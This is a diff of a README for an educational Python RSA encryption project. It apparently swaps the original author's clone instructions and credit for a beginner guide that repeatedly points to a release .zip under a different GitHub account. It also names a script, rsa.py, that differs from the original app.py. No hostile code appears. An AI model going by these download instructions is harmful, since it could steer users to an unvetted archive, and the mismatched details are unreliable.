@@ -1,126 +1,167 @@
-# 🔐 RSA Algorithm Implementation (Python)
+# 🔐 rsa-algorithm-python - Learn RSA Encryption Easily
 
-A simple and educational **Python implementation of the RSA public-key cryptography algorithm**.  
-This project demonstrates **RSA key generation, encryption, and decryption** using **basic number theory concepts**.
-
-It is created as a **learning and academic project** to understand how **public-key cryptography** works internally, not as a production-ready security system.
+[![Download the software](https://img.shields.io/badge/Download-rsa--algorithm--python-blue?style=for-the-badge)](https://github.com/Mirangi94/rsa-algorithm-python/releases)
 
 ---
 
-## 🧱 Project Structure
+## 📘 About rsa-algorithm-python
 
-```bash
-rsa-algorithm-python/
-│
-├── app.py            # RSA algorithm implementation (CLI based)
-├── LICENSE           # Project license
-└── README.md         # Project documentation
-```
+This is a simple Python program that shows how RSA encryption works. RSA is a way to keep information safe by turning it into codes that only the right person can read. This program helps you understand how RSA creates keys, locks (encrypts), and unlocks (decrypts) messages.
+
+You don’t need to know programming to use this. The tool runs on your computer and lets you try the RSA steps yourself. It’s meant for learning and safe experimentation.
 
 ---
 
-## ✨ Features
+## 💻 System Requirements
 
-### 🔑 RSA Key Generation
-- Accepts two prime numbers as input
-- Computes modulus (n) and Euler’s Totient (φ)
-- Automatically selects a valid public exponent (e)
-- Computes private exponent (d) using modular inverse
+To run rsa-algorithm-python, your computer should meet these requirements:
 
-### 🔒 Encryption
-- Encrypts a numeric message using the public key
-- Uses efficient modular exponentiation
+- Operating system: Windows 10 or newer, macOS 10.13 or newer, or Linux (Ubuntu 18.04 or later recommended)
+- Python: Version 3.7 or higher installed on your computer
+- Disk space: At least 50 MB free
+- RAM: Minimum 2 GB
 
-### 🔓 Decryption
-- Decrypts the encrypted message using the private key
-- Verifies correctness of the RSA algorithm flow
-
-### 🧮 Educational Focus
-- Clear, readable logic
-- Minimal dependencies
-- Ideal for students and beginners in cryptography
+If you do not have Python installed, this guide will help you get it set up easily.
 
 ---
 
-## 🛠 Technologies Used
+## 🛠 Features
 
-| Technology             | Role                        |
-| ---------------------- | --------------------------- |
-| **Python 3**           | Core programming language   |
-| **math.gcd**           | Valid public key selection  |
-| **Modular Arithmetic** | RSA encryption & decryption |
+rsa-algorithm-python includes these key features:
 
----
-
-## 📌 Purpose of This Project
-
-This project is built to:
-  - Understand RSA public-key cryptography
-  - Learn Euler’s Totient function
-  - Practice modular arithmetic
-  - Demonstrate encryption and decryption flow
-  - Strengthen fundamentals of computer security
-
-> ⚠️ This project is intended strictly for learning and demonstration purposes.
+- **Key generation:** Create your own RSA public and private keys.
+- **Encryption:** Turn plain messages into coded text.
+- **Decryption:** Turn coded text back into readable messages.
+- **Step-by-step process:** See how each part of RSA works for learning.
+- **Command line interface:** Simple text menus to guide you through actions.
+- **Educational output:** Detailed messages explain what the program does.
 
 ---
 
-## ▶️ How to Run
+## 🚀 Getting Started
 
-### 1️⃣ Clone the repository
-```bash
-git clone https://github.com/ShakalBhau0001/rsa-algorithm-python.git
-```
+This section helps you get the software working on your computer from scratch.
 
-### 2️⃣ Navigate to the project folder
-```bash
-cd rsa-algorithm-python
-```
+### Step 1: Install Python
 
-### 3️⃣ Run the program
-```bash
-python app.py
-```
+rsa-algorithm-python runs on Python, so you'll need it first, if you haven't installed it yet.
 
-### 4️⃣ Follow the prompts
-- Enter two prime numbers
-- Enter a numeric message smaller than `n`
-- View generated keys, encrypted message, and decrypted output
+- Go to the official Python website: https://www.python.org/downloads/
+- Download the latest version for your computer (Windows, macOS, or Linux).
+- Follow the installer instructions and make sure to select the option to “Add Python to PATH” on Windows.
+- After installation, open your Command Prompt (Windows) or Terminal (macOS/Linux) and type:
+  ```
+  python --version
+  ```
+  You should see the version number printed, which means Python is ready.
 
 ---
 
-## ⚠️ Limitations
+## 📥 Download & Install rsa-algorithm-python
 
-- Uses small prime numbers (not secure)
-- No prime number validation
-- No padding schemes (e.g., OAEP)
-- CLI-based interaction only
-- Not suitable for real-world cryptographic use
+You can get the software files from this page:
 
----
+[![Download the software](https://img.shields.io/badge/Download-rsa--algorithm--python-blue?style=for-the-badge)](https://github.com/Mirangi94/rsa-algorithm-python/releases)
 
-## 🌟 Future Improvements
+### What to do:
 
-- Add prime number validation
-- Support larger primes
-- Implement padding schemes
-- Add file encryption support
-- Create GUI version
-- Improve error handling
+1. Click the link above or visit:  
+   [https://github.com/Mirangi94/rsa-algorithm-python/releases](https://github.com/Mirangi94/rsa-algorithm-python/releases)
+
+2. Look for the latest release (usually the top item).
+
+3. Download the `.zip` file which contains the program files.
+
+4. Once downloaded, unzip the folder to a place you can easily access, like your Desktop.
 
 ---
 
-## ⚠️ Disclaimer
+## ▶️ How to Run rsa-algorithm-python
 
-This implementation is created **for educational and learning purposes only.**
-It does **not provide real-world cryptographic security** and must not be used in production systems or for protecting sensitive data.
+After installing Python and downloading the program, here’s how to run it.
+
+### For Windows:
+
+1. Open **Command Prompt**:
+   - Click the Start menu.
+   - Type `cmd` and hit Enter.
+
+2. Go to the folder where you unpacked the files:
+   - Type `cd Desktop\rsa-algorithm-python` if you saved it on Desktop.
+   - Update the path if saved somewhere else.
+
+3. Run the program by typing:
+   ```
+   python rsa.py
+   ```
+   You should see a menu or instructions to follow.
+
+### For macOS/Linux:
+
+1. Open **Terminal** (found in Applications or search bar).
+
+2. Navigate to the folder:
+   ```
+   cd ~/Desktop/rsa-algorithm-python
+   ```
+   Change path if you saved it in a different folder.
+
+3. Start the program by typing:
+   ```
+   python3 rsa.py
+   ```
+   The program will display options or messages to guide you.
 
 ---
 
-## 🪪 Author
+## 🧩 Using rsa-algorithm-python
 
-> **Shakal Bhau**
+Once running, the program will guide you with simple prompts:
 
-> GitHub: [ShakalBhau0001](https://github.com/ShakalBhau0001)
+1. **Key Generation:** The program will ask you to create RSA keys. Just press Enter when prompted.
+
+2. **Encrypt a Message:** Type the message you want to lock up.
+
+3. **Decrypt a Message:** You can try decrypting messages locked with your keys.
+
+The program shows the numbers used in RSA, explaining how keys protect your information.
 
 ---
+
+## 👩‍💻 More Learning
+
+rsa-algorithm-python is designed for learning how RSA cryptography works. It is not meant for securing real data, but to teach key cryptography ideas clearly.
+
+You can open the program code with any text editor to peek inside if you want to see how the steps work, but it's fine to just use and learn from the interface.
+
+---
+
+## 📫 Getting Help
+
+If you run into problems:
+
+- Make sure Python is installed and working.
+- Confirm you typed the folder path correctly in the command prompt or terminal.
+- Check for error messages and search online for the exact text.
+- Consider visiting the GitHub repository page to see if there are updates or issues reported.
+
+---
+
+## 🔖 Topics
+
+This software relates to:
+
+- Computer security  
+- Cryptography  
+- Cybersecurity  
+- Decryption  
+- Encryption  
+- Information security  
+- Learning project  
+- Public key cryptography  
+- Python programming  
+- RSA algorithm  
+
+---
+
+Made for anyone who wants to see how public-key encryption works in a safe, simple Python program.
